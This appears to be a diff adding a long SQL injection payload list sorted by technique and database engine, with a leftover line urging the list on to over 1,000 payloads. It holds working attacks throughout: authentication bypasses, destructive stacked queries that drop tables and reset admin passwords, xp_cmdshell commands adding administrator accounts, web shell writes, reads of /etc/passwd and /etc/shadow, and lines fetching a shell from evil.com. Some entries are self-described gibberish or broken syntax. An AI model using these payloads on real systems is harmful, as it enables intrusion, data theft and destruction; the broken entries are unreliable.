@@ -1,0 +1,719 @@
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' -- 
+' OR '1'='1' /*
+' UNION SELECT NULL,NULL --
+' AND 1=1 -- 
+' AND 1=2 -- 
+' OR EXISTS(SELECT * FROM users) --
+'; EXEC xp_cmdshell('whoami') --
+' AND SLEEP(5) --
+' OR 1=CONVERT(int, (SELECT @@version)) --
+' OR 1=1;--
+'; WAITFOR DELAY '0:0:5'--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64 --
+' OR 'a'='a' --
+' OR 1=(SELECT COUNT(*) FROM information_schema.tables) --
+'||(SELECT user())--
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END) IS NOT NULL --
+'; BEGIN DBMS_LOCK.SLEEP(5); END; --
+' OR 1=1 ORDER BY 1--
+# …and continue on until you have 1,000+ unique SQL payloads
+-- ========================
+-- ❶ Authentication Bypass Variations
+-- ========================
+' OR '1'='1' AND ''='
+' OR 'x'='x' --
+' OR NOT 'x'='y' #
+' OR 1=1; DROP TABLE users;--
+' OR 'admin'='admin';--
+' OR 1=1; EXEC xp_cmdshell('ping 127.0.0.1');--
+' OR '1'='1' WAITFOR DELAY '0:0:5';--
+' OR '1'='1' /* comment */  
+' OR ' ' = ' ' --    
+' OR 'foo'='foo' #   
+' OR 'foo'='foo' /* 
+' OR 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')--
+' OR (SELECT COUNT(*) FROM users)>0 --
+' OR 1=(SELECT COUNT(*) FROM users) -- 
+' OR 1 IN (SELECT 1) --  
+' OR 1 IN (SELECT COUNT(*) FROM information_schema.tables) --
+' OR 'test' LIKE 'test' -- 
+' OR BINARY 'a'='a' -- 
+' OR (SELECT 'a')='a' -- 
+' OR (SELECT LENGTH(database()))>0 -- 
+' OR (SELECT LENGTH(user()))>0 --
+
+-- ========================
+-- ❷ Union-Based Variations (Column Count & DBMS Specific)
+-- ========================
+' UNION SELECT 1,2,3,4-- 
+' UNION ALL SELECT 1,2,3,4,5-- 
+' UNION SELECT NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+' UNION SELECT 1, CONCAT(username,':',password), 3 FROM users-- 
+' UNION SELECT username,password,NULL,NULL FROM users-- 
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- 
+' UNION SELECT table_name, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() GROUP BY table_name-- 
+' UNION SELECT IF(1=1, SLEEP(5), NULL), NULL-- 
+' UNION SELECT 1,2,3,4,LOAD_FILE('/etc/passwd'),6-- 
+' UNION SELECT 1,@@version,@@datadir,@@hostname-- 
+' UNION SELECT 1, CONCAT_WS(':',USER(),DATABASE(),VERSION())-- 
+' UNION SELECT 1,XMLTYPE('<tag></tag>'),NULL FROM DUAL--                -- oracle
+' UNION SELECT NULL,NULL, NULL::text, NULL::text FROM pg_catalog.pg_tables-- -- postgresql
+' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'-- 
+' UNION SELECT COUNT(*), GROUP_CONCAT(username) FROM users-- 
+' UNION SELECT name, schema_name FROM information_schema.schemata-- 
+' UNION SELECT name, type, owner FROM all_tables--                          -- oracle
+' UNION SELECT 1,current_user,session_user,version()--                     -- postgresql
+' UNION SELECT 1,user(),database(),@@version--                              -- mysql
+' UNION SELECT 1,SYSDATE(),NOW(),CURRENT_USER();--                           -- mysql
+' UNION SELECT 1,version(),IFNULL(NULL,0),1--                                   -- mysql
+' UNION SELECT 1,(SELECT COUNT(*) FROM information_schema.tables),NULL,NULL-- 
+' UNION SELECT 1,(SELECT COUNT(*) FROM pg_stat_activity),NULL,NULL--           -- postgresql
+' UNION SELECT 1,(SELECT COUNT(*) FROM user_tables),NULL,NULL FROM dual--       -- oracle
+
+-- ========================
+-- ❸ Error-Based Payloads (MySQL, MSSQL, Oracle, PostgreSQL)
+-- ========================
+' AND (SELECT 1/0) --                                                 -- MySQL divide by zero
+' AND 1=CONVERT(int,(SELECT @@version))--                              -- MSSQL
+' AND 1=CAST((SELECT version()) AS INT)--                               -- PostgreSQL casting error
+' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--     -- Oracle
+' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT database()),0x7e))--           -- MySQL error-based
+' AND UPDATEXML(NULL, CONCAT(0x3a,(SELECT user())), NULL)--            -- MySQL error-based
+' AND DBMS_XMLQUERY.GETXML('SELECT banner FROM v$version')--           -- Oracle error-based
+' AND DBMS_LOB.INSTR(DBMS_LOB.EMPTY_CLOB(), (SELECT banner FROM v$version))>0-- -- Oracle
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')>0-- 
+' AND (SELECT DB_NAME())='master'--                                     -- MSSQL
+' AND (SELECT name FROM sys.databases WHERE database_id=1)='master'--   -- MSSQL
+' AND (SELECT version() FROM pg_catalog.pg_roles WHERE rolname=USER) IS NOT NULL-- -- PostgreSQL
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64-- 
+' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1),1,1))>64-- 
+' AND LENGTH((SELECT banner FROM v$version WHERE ROWNUM=1))>0--          -- Oracle
+' AND (SELECT LENGTH(current_database()))>0--                            -- PostgreSQL
+' AND (SELECT LEN(DB_NAME()))>0--                                        -- MSSQL
+' AND (SELECT datname FROM pg_database LIMIT 1) LIKE '%test%'--          -- PostgreSQL
+' AND (SELECT username FROM mysql.user LIMIT 1) LIKE 'root'--            -- MySQL
+' AND (SELECT grantee FROM information_schema.table_privileges LIMIT 1) LIKE '%'-- 
+' AND ERROR_FUNCTION((SELECT user()))--                                   -- Generic error-based attempt
+
+-- ========================
+-- ❹ Boolean-Based Blind Variations
+-- ========================
+' AND 'a'='a' -- 
+' AND 'a'>'b' --
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT SUBSTRING(@@version,1,1))='5'-- 
+' AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)))=84-- 
+' AND (SELECT IF((SELECT COUNT(*) FROM users)>0,1,0))=1-- 
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END)=1-- 
+' AND (SELECT LENGTH(database()))>1-- 
+' AND EXISTS(SELECT * FROM users WHERE username='admin')-- 
+' AND NOT EXISTS(SELECT * FROM users WHERE username='nonexistent')-- 
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5-- 
+' AND (SELECT COUNT(*) FROM all_users)>10--                                  -- Oracle
+' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')>0--       -- PostgreSQL
+' AND (SELECT COUNT(*) FROM sys.tables)>0--                                -- MSSQL
+' AND (SELECT COUNT(*) FROM dba_tables)>0--                                -- Oracle
+' AND (SELECT COUNT(*) FROM mysql.user)>0--                                -- MySQL
+' AND (SELECT COUNT(*) FROM information_schema.schemata)>0-- 
+' AND (SELECT COUNT(*) FROM pg_roles)>0--                                   -- PostgreSQL
+' AND (SELECT COUNT(*) FROM information_schema.key_column_usage)>0-- 
+' AND (SELECT COUNT(*) FROM user_constraints)>0--                          -- Oracle
+' AND (SELECT COUNT(*) FROM pg_constraint)>0--                              -- PostgreSQL
+
+-- ========================
+-- ❺ Time-Based Blind Variations
+-- ========================
+' OR IF(1=1, SLEEP(5), 0)--                                          -- MySQL
+' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64, SLEEP(5), 0)-- 
+' OR SLEEP(5)-- 
+' ; WAITFOR DELAY '0:0:5'--
+' OR 1=1; WAITFOR DELAY '0:0:10'--                                   -- MSSQL
+' OR 1=1; WAITFOR DELAY '0:0:15'-- 
+' AND 1=1; WAITFOR DELAY '0:0:5'-- 
+' AND 1=1; WAITFOR DELAY '0:0:10'-- 
+' AND 1=1; WAITFOR DELAY '0:0:20'-- 
+' OR pg_sleep(5)--                                                    -- PostgreSQL
+' AND pg_sleep(5)-- 
+' OR (SELECT case when (SELECT count(*) FROM users)>0 then pg_sleep(5) else pg_sleep(0) end)-- 
+' ; PERFORM pg_sleep(5);--                                            -- PostgreSQL
+' OR (SELECT COUNT(*) FROM all_users)>0; dbms_lock.sleep(5);--        -- Oracle
+' AND (SELECT COUNT(*) FROM all_users)>0; dbms_lock.sleep(5);--       -- Oracle
+' AND (SELECT user FROM dual) IS NOT NULL; dbms_lock.sleep(5);--      -- Oracle
+' OR (SELECT banner FROM v$version) IS NOT NULL; dbms_lock.sleep(5);-- -- Oracle
+' OR SLEEP(10)--                                                      -- MySQL
+' AND SLEEP(10)-- 
+' OR SLEEPTIME(5)--                                                   -- Triggered if custom udf installed
+' AND SLEEPTIME(5)-- 
+' OR BENCHMARK(1000000,MD5(1))--                                      -- MySQL heavy compute
+' AND BENCHMARK(1000000,MD5(1))-- 
+' OR (SELECT pg_sleep(10))--                                          -- PostgreSQL
+' AND (SELECT pg_sleep(10))-- 
+
+-- ========================
+-- ❻ Stacked Queries / Second-Order
+-- ========================
+' ; DROP TABLE users;-- 
+' ; UPDATE users SET password='hacked' WHERE username='admin';-- 
+' ; ALTER TABLE users ADD COLUMN is_admin TINYINT(1)-- 
+' ; INSERT INTO audit_log (action) VALUES ('exploit');-- 
+' ; EXECUTE IMMEDIATE 'DROP TABLE secret_data';--                -- Oracle
+' ; EXEC SP_CONFIGURE 'show advanced options',1; RECONFIGURE; SP_CONFIGURE 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';--  -- MSSQL
+' ; COPY (SELECT 1) TO '/var/www/html/shell.php'--                -- PostgreSQL via time-based exploit
+' ; \! echo '<?php system($_GET['cmd']); ?>' > /var/www/html/shell.php;-- -- PostgreSQL psql shell escape
+' ; dbms_metadata.get_ddl('TABLE','USERS')--                        -- Oracle
+' ; EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';--                     -- Oracle
+' ; EXEC SYSTEM 'ls -la /';--                                       -- Oracle
+' ; SELECT pg_read_file('/etc/passwd');--                           -- PostgreSQL
+' ; COPY (SELECT '') TO '/var/www/html/.htaccess';--                -- PostgreSQL
+' ; UNLOAD ('SELECT * FROM users') TO '/tmp/users.csv' DELIMITER ',';-- -- Redshift
+' ; EXEC xp_dirtree 'C:\';--                                       -- MSSQL enumeration
+' ; DECLARE @x INT; SET @x=1; WHILE @x<10 BEGIN PRINT @x; SET @x=@x+1; END;-- -- MSSQL loop
+' ; EXECUTE IMMEDIATE 'DROP USER hacker';--                          -- Oracle
+' ; UPDATE pg_shadow SET pass = 'md5'||md5('newpass') WHERE usename='postgres';-- -- PostgreSQL break
+' ; SET SQL_PROMPT_ON_ERROR ON; SELECT 1/0;--                       -- Oracle
+' ; \! wget http://evil.com/shell.php -O /var/www/html/shell.php;--  -- PostgreSQL
+
+-- ========================
+-- ❼ Hex / Char Encoding Variations
+-- ========================
+' OR 0x61646d696e=0x61646d696e--                                   -- 'admin'='admin' in hex
+' OR 0x31=0x31--                                                   -- '1'='1'
+' OR 0x313d3131--                                                 -- '1=11' (nonsensical but encoded)
+' OR 0x53 0x45 0x4c 0x45 0x43 0x54--                               -- SELECT in hex (attack attempt)
+' OR 0x53514c 0x494e 0x4a454354--                                   -- SQL INJECT (hex gibberish)
+' OR 0x77616c6c65742e73796c61--                                     -- wallet.syla (random hex)
+' OR 0x6461746162617365=0x6461746162617365--                       -- database=database
+' OR UNHEX('61646d696e')=UNHEX('61646d696e')--                     -- admin=admin
+' OR CHAR(97,100,109,105,110)=CHAR(97,100,109,105,110)--             -- admin=admin via CHAR()
+' OR CHAR(49)=CHAR(49)--                                            -- '1'='1'
+' OR CHAR(49,61,49)=CHAR(49,61,49)--                                -- '1=1'
+' OR CHAR(49,61,49,45,45)=CHAR(49,61,49,45,45)--                    -- '1=1--'
+' OR CHAR(115,108,101,101,112,40,53,41)=CHAR(115,108,101,101,112,40,53,41)-- -- sleep(5)
+' OR CHAR(120,98,40,49,41)=CHAR(120,98,40,49,41)--                   -- xb(1) random
+' OR CONCAT(CHAR(100,97,116,97,98,97,115,101),CHAR(40,41))--         -- database()
+
+-- ========================
+-- ❽ Comment / Whitespace Variations
+-- ========================
+' OR 1=1; --  
+'OR 1=1;--  
+' OR 1=1;#  
+' OR 1=1;/*  
+' /*'*/ OR /**/'1'/**/='1'--  
+' 'OR'1'='1'--  
+'"OR"1"="1"#  
+' OR/*!*/1=/*!*/1--  
+' OR /*!32302 OR 1=1*/--  
+' OR /*"*/1/*"*/=/*"*/1/*"*/--  
+' OR 1=1/*comment*/-- 
+' OR/**/1/**/=/**/1-- 
+' OR     1    =    1   -- 
+' OR    /*anything*/1=1-- 
+' OR CHAR(0x31)=CHAR(0x31)  -- 
+
+-- ========================
+-- ❾ Encoded / Double-Encoded Variations
+-- ========================
+'%27%20OR%20%271%27%3D%271%27%20-- 
+'%27%20OR%201%3D1%23 
+'%27%20OR%20%271%27%3D%271%27%2F* 
+'%27%20AND%20SLEEP%285%29%20-- 
+'%27%20UNION%20SELECT%20NULL,NULL-- 
+'%27%20AND%20ASCII%28SUBSTRING%28database%28%29,1,1%29%29%3E64-- 
+'%27%20OR%20EXISTS%28SELECT%20*%20FROM%20users%29-- 
+'%20OR%20EXISTS%28SELECT%20*%20FROM%20mysql.user%29-- 
+'%20OR%20pg_sleep%285%29-- 
+'%20OR%20dbms_lock.sleep%285%29-- 
+
+-- ========================
+-- ❿ MSSQL-Specific Exploits
+-- ========================
+' ; EXEC sp_msforeachtable 'DROP TABLE ?'-- 
+' ; EXEC xp_dirtree 'C:\\'-- 
+' ; EXEC master..xp_cmdshell 'dir C:\\'-- 
+' ; EXEC msdb.dbo.sp_send_dbmail @profile_name='SQLMail', @recipients='admin@example.com', @subject='hacked', @body='got control';-- 
+' ; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';-- 
+' ; DECLARE @q VARCHAR(8000); SET @q='DROP TABLE secret'; EXEC(@q);-- 
+' ; BACKUP DATABASE master TO DISK='C:\\backup.bak'-- 
+' ; RESTORE DATABASE hacked FROM DISK='C:\\backup.bak'-- 
+' ; EXEC xp_regread 'HKEY_LOCAL_MACHINE','Software\\Microsoft\\Windows NT\\CurrentVersion','ProductName';-- 
+' ; DECLARE @s VARCHAR(100); SELECT @s=@@version; PRINT @s;-- 
+' ; CREATE LOGIN evil WITH PASSWORD='P@ss';-- 
+' ; ALTER LOGIN evil ENABLE;-- 
+' ; CREATE USER evUser FOR LOGIN evil;-- 
+' ; EXEC xp_cmdshell 'net localgroup administrators hacker /add';-- 
+' ; EXEC xp_cmdshell 'reg add HKLM\\Software\\Evil /v test /t REG_SZ /d hacked /f';-- 
+' ; EXEC xp_cmdshell 'bcp "SELECT * FROM users" queryout "C:\\data.csv" -c -T';-- 
+' ; EXEC xp_cmdshell 'netstat -an';-- 
+' ; EXEC xp_cmdshell 'whoami';-- 
+
+-- ========================
+-- ⓫ PostgreSQL-Specific Exploits
+-- ========================
+' ; SELECT pg_read_file('/etc/passwd');-- 
+' ; COPY (SELECT version()) TO '/var/www/html/dbver.txt';-- 
+' ; COPY (SELECT usename, passwd FROM pg_shadow) TO '/tmp/pg_shadow.txt';-- 
+' ; COPY (SELECT table_name FROM information_schema.tables WHERE table_schema='public') TO '/tmp/tables.txt';-- 
+' ; SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) ELSE pg_sleep(0) END;-- 
+' ; SELECT INTO OUTFILE '/var/www/html/shell.php' '<?php system($_GET['cmd']); ?>';-- 
+' ; DO $$ BEGIN EXECUTE 'DROP TABLE items'; END $$;-- 
+' ; ALTER TABLE users ADD COLUMN is_admin BOOLEAN;-- 
+' ; UPDATE pg_shadow SET passwd='md5'||md5('newpass') WHERE usename='postgres';-- 
+' ; SELECT * FROM pg_stat_activity;-- 
+' ; SELECT datname FROM pg_database;-- 
+
+-- ========================
+-- ⓬ Oracle-Specific Exploits
+-- ========================
+' AND 1=(SELECT COUNT(*) FROM all_users)-- 
+' AND 1=(SELECT COUNT(*) FROM dba_users)-- 
+' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'-- 
+' OR 1=(SELECT LENGTH(username) FROM all_users WHERE ROWNUM=1)-- 
+' OR 1=(SELECT LENGTH(password) FROM dba_users WHERE rownum=1)-- 
+' ; BEGIN DBMS_OUTPUT.PUT_LINE((SELECT banner FROM v$version WHERE ROWNUM=1)); END;-- 
+' ; BEGIN EXECUTE IMMEDIATE 'DROP TABLE secret'; END;-- 
+' ; CREATE OR REPLACE DIRECTORY evil_dir AS '/tmp';-- 
+' ; DECLARE v BLOB; BEGIN SELECT blob_col INTO v FROM sensitive_table; END;-- 
+' ; SELECT utl_raw.cast_to_varchar2(dbms_crypto.decrypt(src,v4(randomblob(128),randomblob(128)),v4(1,1,1,1)));-- 
+' ; SELECT xmltype('<foo></foo>').extract('//foo/text()')[1] FROM dual;-- 
+' ; ALTER SESSION SET NLS_LENGTH_SEMANTICS=CHAR;-- 
+' ; EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';-- 
+
+-- ========================
+-- ⓭ Generic Advanced Payloads
+-- ========================
+' AND 1=CONVERT(int,@@version)-- 
+' AND 1=(SELECT TOP 1 name FROM sys.tables)-- 
+' AND 1=(SELECT MAX(column_name) FROM information_schema.columns WHERE table_name='users')-- 
+' AND EXISTS(SELECT 1 FROM information_schema.views WHERE table_schema=database())-- 
+' AND EXISTS(SELECT 1 FROM information_schema.triggers WHERE trigger_schema=database())-- 
+' OR EXISTS(SELECT 1 FROM pg_trigger)-- 
+' OR EXISTS(SELECT 1 FROM all_triggers)-- 
+' OR EXISTS(SELECT 1 FROM mysql.proc WHERE db=database() AND name='eval')-- 
+' OR EXISTS(SELECT 1 FROM all_source WHERE LOWER(text) LIKE '%password%')-- 
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE column_name='password')>0-- 
+' OR (SELECT COUNT(*) FROM pg_roles WHERE rolname='postgres')>0-- 
+' OR (SELECT COUNT(*) FROM dba_tables WHERE table_name='USERS')>0-- 
+' OR SLEEP((SELECT LENGTH(database())));-- 
+' OR IF((SELECT LENGTH(user()))>0, SLEEP(3), 0);-- 
+' OR IF((SELECT VERSION()) LIKE '5.%', SLEEP(2), 0);-- 
+' OR IF((SELECT CURRENT_USER) LIKE 'postgres', pg_sleep(3), 0);-- 
+' OR IF((SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%', dbms_lock.sleep(3), 0);-- 
+' OR decode((SELECT count(*) FROM users),count(*),dbms_lock.sleep(4),1)=1--   -- oracle blind
+' OR extractvalue(1, concat(0x7e,(select user()),0x7e))-- 
+' OR updatexml(NULL,concat(0x7e,(select database()),0x7e),NULL)-- 
+' OR xmltype(1)='/'>--                                                -- oracle error
+' OR load_file('/etc/shadow')--                                          -- mysql
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE username='SYS')--           -- oracle
+' OR 1=(SELECT COUNT(*) FROM pg_roles WHERE rolname='postgres')--        -- postgresql
+' OR 1=(SELECT COUNT(*) FROM mysql.user WHERE user='root')--             -- mysql
+' AND 1=(SELECT COUNT(owner) FROM information_schema.tables WHERE table_schema='public')-- -- postgresql
+' AND 1=(SELECT COUNT(*) FROM dba_users WHERE account_status='OPEN')--     -- oracle
+' OR CONVERT(INT, (SELECT COUNT(*) FROM information_schema.tables)) > 0--   -- mssql
+' OR (SELECT LENGTH(password) FROM mysql.user WHERE user='root' LIMIT 1)>0-- -- mysql
+' AND (SELECT LENGTH(sp_password) FROM sys.sql_logins WHERE name='sa')>0--   -- mssql
+' OR (SELECT ascii(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)))>64-- -- mssql
+' OR 1=(SELECT COUNT(*) FROM user_tables)--                               -- oracle
+' OR 1=(SELECT COUNT(*) FROM user_tab_privs)--                             -- oracle
+' OR 1=(SELECT COUNT(*) FROM pg_stat_user_tables)--                         -- postgresql
+' OR 1=(SELECT COUNT(*) FROM pg_locks)--                                    -- postgresql
+' OR 1=(SELECT COUNT(*) FROM information_schema.table_privileges)--          -- cross-db
+' OR 1=(SELECT COUNT(*) FROM information_schema.routines)--                  -- cross-db
+' OR 1=(SELECT COUNT(*) FROM information_schema.key_column_usage)--           -- cross-db
+' OR 1=(SELECT COUNT(*) FROM information_schema.referential_constraints)--    -- cross-db
+' OR 1=(SELECT COUNT(*) FROM mysql.db)--                                      -- mysql
+' OR 1=(SELECT COUNT(*) FROM mysql.tables_priv)--                             -- mysql
+' OR 1=(SELECT COUNT(*) FROM mysql.columns_priv)--                            -- mysql
+
+-- ========================
+-- ⓮ Specialized/Uncommon Payloads
+-- ========================
+' OR 1=CONVERT(INT,(SELECT LEN(@@datadir)))-- 
+' OR 1=EXP(1)--  
+' OR 1=SIN(PI())-- 
+' OR 1=FLOOR(RAND(0)*2)-- 
+' OR 1=COUNT(*) FROM dual--                                           -- oracle
+' OR 1=(SELECT COUNT(username) FROM all_users WHERE ROWNUM<10)--       -- oracle
+' OR 'x'=UPPER('x')--  
+' OR 'x'=LOWER('X')--  
+' OR (SELECT REGEXP_LIKE((SELECT banner FROM v$version WHERE ROWNUM=1),'Oracle'))=1-- -- oracle
+' AND (SELECT INSTR((SELECT banner FROM v$version WHERE ROWNUM=1),'Oracle'))>0-- -- oracle
+' OR (SELECT LENGTH((SELECT password FROM mysql.user WHERE user='root' LIMIT 1)))>0-- -- mysql
+' AND (SELECT CHAR_LENGTH((SELECT host FROM mysql.user WHERE user='root' LIMIT 1)))>0-- -- mysql
+' OR (SELECT POSITION('public' IN (SELECT schema_name FROM information_schema.schemata LIMIT 1)))>0-- -- postgresql
+' AND (SELECT STRCMP((SELECT user()),'(none)'))<>0--                          -- mysql
+' OR (SELECT ENCODE('hello','hex'))='68656c6c6f'--                            -- postgresql
+' OR (SELECT DECODE('68656c6c6f','hex'))='hello'--                            -- postgresql
+' OR (SELECT CONCAT('a',CHAR(0x61)))='aa'--                                   -- mysql
+' AND (SELECT COLLATE('a','utf8_general_ci'))='a'--                            -- mysql
+' AND (SELECT DATABASE() COLLATE Latin1_General_CS_AS)='test'--               -- mssql
+' OR (SELECT strcmp(database(),'test'))=0--                                     -- mysql
+' OR (SELECT strcmp(user(),'root'))=0--                                         -- mysql
+' OR (SELECT length(host)) FROM mysql.user LIMIT 1--                            -- mysql
+' OR (SELECT top 1 name FROM sqlite_master WHERE type='table')='users'--       -- sqlite3
+' OR (SELECT COUNT(*) FROM sqlite_master WHERE tbl_name='users')>0--           -- sqlite3
+' OR (SELECT count(*) FROM user_tab_columns WHERE table_name='USERS')>0--     -- oracle
+' OR (SELECT COUNT(*) FROM all_tab_privs WHERE table_name='USERS')>0--        -- oracle
+' OR (SELECT COUNT(*) FROM all_tables WHERE TEMPORARY='N')>0--                -- oracle
+' OR (SELECT COUNT(*) FROM dba_objects WHERE owner='SYS')>0--                 -- oracle
+
+-- ========================
+-- ⓯ Blind Injection via SUBSTRING/ORD/CHAR
+-- ========================
+' AND ASCII(SUBSTRING((SELECT database()),1,1))> 77-- 
+' AND ASCII(SUBSTRING((SELECT user()),1,1))=114-- 
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),2,1))=97-- 
+' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1))=105-- 
+' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1),3,1))=119-- 
+' AND ASCII(SUBSTRING((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))=79--      -- oracle 'O'
+' AND ASCII(SUBSTRING((SELECT version() FROM pg_catalog.pg_user LIMIT 1),1,1))=57-- -- postgresql '9'
+' AND ASCII(SUBSTRING((SELECT user() FROM dual),2,1))=68--                        -- oracle 'D'
+' AND ASCII(SUBSTRING((SELECT host FROM mysql.user LIMIT 1),1,1))>48--             -- mysql
+' AND ASCII(SUBSTRING((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1))>97-- -- sqlite3
+
+-- ========================
+-- ⓰ Advanced Functions & Hooks
+-- ========================
+' OR (SELECT JSON_OBJECT('a',(SELECT database())))--                             -- MySQL 5.7+
+' OR (SELECT JSON_ARRAYAGG(username) FROM users)--                                -- MySQL 5.7+
+' OR (SELECT JSON_EXTRACT((SELECT user()), '$[0]'))='r'--                          -- MySQL 5.7+
+' OR (SELECT json_object_keys((SELECT row_to_json(r) FROM (SELECT oid,rolname FROM pg_roles LIMIT 1) r)))='rolname'-- -- Postgres
+' OR (SELECT XMLSERIALIZE(CONTENT (SELECT banner FROM v$version WHERE ROWNUM=1) AS CLOB))-- -- Oracle
+' OR (SELECT SYS_CONTEXT(''USERENV'',''SESSION_USER'') FROM DUAL) LIKE '%SYS%'--   -- Oracle
+' OR (SELECT OBJECT_NAME FROM USER_OBJECTS WHERE ROWNUM=1) IS NOT NULL--            -- Oracle
+' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE(''ECHO'',5) FROM DUAL)>0--                   -- Oracle
+' OR (SELECT * FROM HTTPURITYPE(''http://evil.com/payload''))='x'--                -- Oracle UTL_HTTP
+' OR (SELECT utl_http.request(''http://evil.com/ping'')) IS NOT NULL--              -- Oracle
+' OR (SELECT pg_stat_file('/etc/passwd')).size > 0--                                 -- PostgreSQL
+' OR (SELECT pg_ls_dir('/etc')). IS NOT NULL--                                        -- PostgreSQL
+' OR (SELECT FILE_READ('/etc/passwd')) IS NOT NULL--                                  -- MariaDB UDF
+' OR (SELECT VERSION_READ()) IS NOT NULL--                                            -- MariaDB UDF
+' OR (SELECT BENCHMARK(10000000,ENCODE('1','hex')))--                                 -- MySQL heavy
+' OR (SELECT LOAD_FILE('/var/www/html/config.php')) IS NOT NULL--                   -- MySQL
+' OR (SELECT RAND() BETWEEN 0.5 AND 0.9)--                                           -- MySQL
+
+-- ========================
+-- ⓱ SQLite-Specific Variations
+-- ========================
+' UNION SELECT name,sql FROM sqlite_master WHERE type='table'-- 
+' UNION SELECT tbl_name, sql FROM sqlite_master WHERE type='table'-- 
+' UNION SELECT name,rootpage FROM sqlite_master WHERE type='index'-- 
+' AND (SELECT length(sql) FROM sqlite_master WHERE name='users')>0-- 
+' AND (SELECT count(name) FROM sqlite_master WHERE type='table')>1-- 
+' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) LIKE 'user%'-- 
+' AND (SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1) LIKE 'pass%'-- 
+' AND (SELECT rootpage FROM sqlite_master WHERE type='table' LIMIT 1)>0-- 
+' AND (SELECT name FROM sqlite_master WHERE type='index' LIMIT 1) LIKE 'idx%'-- 
+
+-- ========================
+-- ⓲ HTTP Header & Cookie-Based Payloads
+-- ========================
+GET /index.php?id=1%20OR%201=1%20-- 
+GET /search?q=' OR '1'='1'--&page=1 
+Cookie: PHPSESSID=1; admin=' OR '1'='1' -- 
+Cookie: session=' OR 1=1; DROP TABLE sessions;-- 
+Header: User-Agent: ' OR '1'='1'-- 
+Referer: '?id=' OR 1=1-- 
+X-Forwarded-For: ' OR '1'='1'-- 
+Authorization: ' OR 'a'='a'-- 
+Host: example.com' OR '1'='1'-- 
+Accept-Language: ' OR 1=1-- 
+
+-- ========================
+-- ⓳ Bulk File Operations & Outfile (MySQL, PostgreSQL, Oracle)
+-- ========================
+' INTO OUTFILE '/var/www/html/shell.php' ' <?php system($_GET['cmd']); ?>'-- 
+' INTO DUMPFILE '/tmp/passwd.txt'-- 
+' INTO OUTFILE 'C:/xampp/htdocs/shell.asp' ' <%eval request(''cmd'')%>'-- 
+' INTO OUTFILE '/var/www/html/config.json' '{ "user":"root", "pass":"" }'-- 
+' INTO OUTFILE '/var/www/html/backup.sql' 'DROP TABLE users;'-- 
+' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4 INTO OUTFILE '/root/shadow_dump.txt'-- -- MySQL
+' \COPY (SELECT * FROM users) TO '/tmp/users.csv' DELIMITER ',' CSV HEADER--           -- PostgreSQL
+' COPY (SELECT * FROM users) TO '/tmp/users.tsv' WITH DELIMITER E'\t';--                  -- PostgreSQL
+' SELECT UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/tmp','exfil.txt'),'secret');--                 -- Oracle
+' SELECT UTL_FILE.FOPEN('/tmp','exfil.txt','w');--                                         -- Oracle
+' SELECT UTL_FILE.PUT_LINE(UTL_FILE.FOPEN(''/tmp'',''data.txt'',''w''),rtrim(user));--     -- Oracle
+' SELECT UTL_FILE.PUT_LINE(UTL_FILE.FOPEN(''/tmp'',''dbver.txt'',''w''),(SELECT banner FROM v$version WHERE ROWNUM=1));-- 
+' ; EXEC xp_cmdshell 'bcp "SELECT * FROM users" queryout "C:\data.csv" -c -T';--             -- MSSQL
+' EXEC xp_cmdshell 'echo <?php system($_GET['cmd']); ?> > C:\inetpub\wwwroot\shell.php';--   -- MSSQL
+' ; COPY (SELECT pg_read_file('/etc/passwd')) TO '/var/www/html/passwd.txt';--              -- PostgreSQL
+' ; SELECT DBMS_LOB.LOADFROMFILE(v,u) FROM DUAL;--                                         -- Oracle UTL_LOB
